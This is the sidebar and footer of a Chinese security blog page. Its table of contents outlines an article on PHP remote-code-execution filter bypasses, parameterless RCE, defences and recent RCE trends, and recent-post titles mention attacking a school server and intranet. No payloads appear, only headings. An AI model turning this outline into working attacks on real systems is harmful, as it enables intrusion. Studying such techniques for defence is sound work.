toc-level-2"><a class="toc-link" href="#2%E3%80%81%E5%8D%95%E5%8F%8C%E5%8F%8D%E5%BC%95%E5%8F%B7-%E5%8F%8D%E6%96%9C%E6%9D%A0"><span class="toc-number">5.2.</span> <span class="toc-text">2、单双反引号&amp;反斜杠</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC%E9%87%8D%E7%BB%84"><span class="toc-number">5.3.</span> <span class="toc-text">3、变量赋值重组</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E7%BC%96%E7%A0%81-%E8%A7%A3%E7%A0%81%E7%BB%95%E8%A1%8C"><span class="toc-number">5.4.</span> <span class="toc-text">4、编码 &#x2F; 解码绕行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E5%91%BD%E4%BB%A4%E6%9B%BF%E6%8D%A2%E5%B5%8C%E5%A5%97"><span class="toc-number">5.5.</span> <span class="toc-text">5、命令替换嵌套</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shell%E5%91%BD%E4%BB%A4%E3%81%AE%E6%9B%BF%E6%8D%A2%E7%BB%95%E8%BF%87"><span class="toc-number">6.</span> <span class="toc-text">Shell命令の替换绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell%E5%91%BD%E4%BB%A4%E8%BF%87%E6%BB%A4%EF%BC%9A"><span class="toc-number">6.1.</span> <span class="toc-text">Shell命令过滤：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CAT%EF%BC%9A"><span class="toc-number">6.1.1.</span> <span class="toc-text">CAT：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LS%EF%BC%9A"><span class="toc-number">6.1.2.</span> <span class="toc-text">LS：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC"><span class="toc-number">6.1.3.</span> <span class="toc-text">空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%9C%E6%9D%A0"><span class="toc-number">6.1.4.</span> <span class="toc-text">斜杠</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E3%81%AE%E6%9B%BF%E6%8D%A2%E7%BB%95%E8%BF%87"><span class="toc-number">7.</span> <span class="toc-text">函数の替换绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%89%E8%A1%8C-%E6%95%B4%E4%BD%93%E8%AF%BB"><span class="toc-number">7.0.1.</span> <span class="toc-text">按行&#x2F;整体读</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E5%BC%8F%E8%AF%BB"><span class="toc-number">7.0.2.</span> <span class="toc-text">流式读</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E7%B1%BB"><span class="toc-number">7.0.3.</span> <span class="toc-text">目录遍历类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%87%BD%E6%95%B0%EF%BC%88%E9%85%8D%E5%90%88%E5%88%A9%E7%94%A8%EF%BC%89"><span class="toc-number">7.0.4.</span> <span class="toc-text">其他信息泄露函数（配合利用）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE%E5%8C%85%E8%A3%85%E5%99%A8%EF%BC%88%E9%85%8D%E5%90%88%E8%AF%BB%E5%8F%96-%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">7.0.5.</span> <span class="toc-text">协议包装器（配合读取&#x2F;绕过）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#eval-%E5%9C%BA%E6%99%AF%E5%86%85%E7%9A%84%E7%BB%86%E8%8A%82%E7%BB%95%E8%BF%87"><span class="toc-number">8.</span> <span class="toc-text">eval 场景内的细节绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%88%86%E5%8F%B7%E8%A2%AB%E7%A6%81-%E2%86%92-%E7%94%A8-%E9%97%AD%E5%90%88"><span class="toc-number">8.1.</span> <span class="toc-text">1. 分号被禁 → 用 ?&gt; 闭合</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-echo-%E8%A2%AB%E7%A6%81-%E2%86%92-%E7%9F%AD%E6%A0%87%E7%AD%BE"><span class="toc-number">8.2.</span> <span class="toc-text">2. echo 被禁 → 短标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-GET-%E8%A2%AB%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-number">8.3.</span> <span class="toc-text">3. $_GET 被关键字过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%BC%95%E5%8F%B7%E8%A2%AB%E7%A6%81-%E2%86%92-%E6%97%A0%E5%BC%95%E5%8F%B7%E4%BC%A0%E5%8F%82"><span class="toc-number">8.4.</span> <span class="toc-text">4. 引号被禁 → 无引号传参</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%A2%AB%E7%A6%81-%E2%86%92-%E8%AF%AD%E4%B9%89%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2"><span class="toc-number">8.5.</span> <span class="toc-text">5. 关键字被禁 → 语义等价替换</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E4%B8%80%E4%B8%AA%E5%B8%B8%E8%A7%81%E8%AF%AF%E5%8C%BA"><span class="toc-number">8.6.</span> <span class="toc-text">6. 一个常见误区</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0RCE%EF%BC%88eval%EF%BC%89"><span class="toc-number">9.</span> <span class="toc-text">无参数RCE（eval）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95"><span class="toc-number">9.1.</span> <span class="toc-text">1、获取当前目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">9.2.</span> <span class="toc-text">2、目录扫描函数：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E6%95%B0%E7%BB%84%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">9.3.</span> <span class="toc-text">3、数组处理函数：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%87%BD%E6%95%B0%EF%BC%88payload-%E6%9C%80%E5%A4%96%E5%B1%82%EF%BC%8C%E8%BE%93%E5%87%BA-flag%EF%BC%89"><span class="toc-number">9.4.</span> <span class="toc-text">4、文件读取函数（payload 最外层，输出 flag）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0RCE%EF%BC%88session%EF%BC%89"><span class="toc-number">10.</span> <span class="toc-text">无参数RCE（session）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%80%83%E8%99%91%E4%B8%80%E4%B8%8B%EF%BC%9A"><span class="toc-number">11.</span> <span class="toc-text">考虑一下：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE%E7%9A%84%E9%98%B2%E6%8A%A4"><span class="toc-number">12.</span> <span class="toc-text">RCE的防护</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BB%A3%E7%A0%81%E5%B1%82%EF%BC%88%E6%A0%B9%E6%BA%90%E9%98%B2%E6%8A%A4%EF%BC%8C%E6%9C%80%E9%87%8D%E8%A6%81%EF%BC%89"><span class="toc-number">12.1.</span> <span class="toc-text">1. 代码层（根源防护，最重要）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-PHP-%E9%85%8D%E7%BD%AE%E5%8A%A0%E5%9B%BA"><span class="toc-number">12.2.</span> <span class="toc-text">2. PHP 配置加固</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%9C%8D%E5%8A%A1%E5%99%A8-%E7%B3%BB%E7%BB%9F%E5%B1%82%E9%9D%A2"><span class="toc-number">12.3.</span> <span class="toc-text">3. 服务器 &#x2F; 系统层面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E4%B8%8E%E8%BF%90%E8%A1%8C%E9%98%B2%E6%8A%A4"><span class="toc-number">12.4.</span> <span class="toc-text">4. 安全设备与运行防护</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE%E7%8E%B0%E4%BB%A3%E7%8A%B6%E5%86%B5"><span class="toc-number">13.</span> <span class="toc-text">RCE现代状况</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%97%B6%E9%97%B4%E7%AA%97%E5%8F%A3%E5%9D%8D%E5%A1%8C%EF%BC%9A%E4%BB%8E-756-%E5%A4%A9%E5%88%B0-4-%E5%B0%8F%E6%97%B6"><span class="toc-number">13.1.</span> <span class="toc-text">一、时间窗口坍塌：从 756 天到 4 小时</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E9%9B%B6%E6%97%A5%E5%8C%96%EF%BC%9A2026-%E5%B9%B4%E8%A2%AB%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E4%B8%AD-67-2-%E6%98%AF%E9%9B%B6%E6%97%A5"><span class="toc-number">13.2.</span> <span class="toc-text">二、零日化：2026 年被利用漏洞中 67.2% 是零日</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E8%A7%84%E6%A8%A1%E4%B8%8E%E6%9E%84%E6%88%90%EF%BC%9A%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%BB%8D%E6%98%AF-RCE-%E4%B9%8B%E7%8E%8B"><span class="toc-number">13.3.</span> <span class="toc-text">三、规模与构成：命令注入仍是 RCE 之王</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E9%87%8D%E7%81%BE%E5%8C%BA%E5%88%86%E5%B8%83%EF%BC%882025%E2%80%932026-%E7%9A%84%E4%BB%A3%E8%A1%A8%E6%80%A7%E5%9C%A8%E9%87%8E-RCE%EF%BC%89"><span class="toc-number">13.4.</span> <span class="toc-text">四、重灾区分布（2025–2026 的代表性在野 RCE）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%BE%B9%E7%BC%98%E8%AE%BE%E5%A4%87-%E7%BD%91%E5%85%B3%E4%BB%8D%E6%98%AF%E5%A4%B4%E5%8F%B7%E5%85%A5%E5%8F%A3"><span class="toc-number">13.4.1.</span> <span class="toc-text">1. 边缘设备&#x2F;网关仍是头号入口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-AI-%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%88%90%E4%B8%BA%E6%96%B0%E5%A4%A7%E9%99%86"><span class="toc-number">13.4.2.</span> <span class="toc-text">2. AI 基础设施成为新大陆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%BC%81%E4%B8%9A%E8%BD%AF%E4%BB%B6%E4%BE%9B%E5%BA%94%E9%93%BE"><span class="toc-number">13.4.3.</span> <span class="toc-text">3. 企业软件供应链</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E9%98%B2%E5%BE%A1%E8%8C%83%E5%BC%8F%E7%9A%84%E5%AE%9E%E9%99%85%E8%BD%AC%E5%8F%98"><span class="toc-number">13.5.</span> <span class="toc-text">五、防御范式的实际转变</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">14.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/09/11/%E5%AD%A6%E6%A0%A1%E6%9C%8D%E5%8A%A1%E5%99%A8RCE%E6%A4%8D%E5%85%A5%E6%9C%A8%E9%A9%AC%F0%9F%A4%A8/" title="学校服务器RCE植入木马🤨">学校服务器RCE植入木马🤨</a><time datetime="2026-09-11T08:10:45.883Z" title="发表于 2026-09-11 16:10:45">2026-09-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/09/08/SSRF%E5%87%BB%E7%A9%BF%E5%AD%A6%E6%A0%A1%E5%86%85%E7%BD%91/" title="😡SSRF击穿学校内网😡">😡SSRF击穿学校内网😡</a><time datetime="2026-09-08T15:37:54.768Z" title="发表于 2026-09-08 23:37:54">2026-09-08</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2024 - 2026 By Teaaa</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.7.1.260810</a></span></div><div class="footer_custom_text">navy~</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.7.1.260810"></script><script src="/js/main.js?v=5.7.1.260810"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="220,100,40" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.7.1.260810"></script></div></div></body></html>
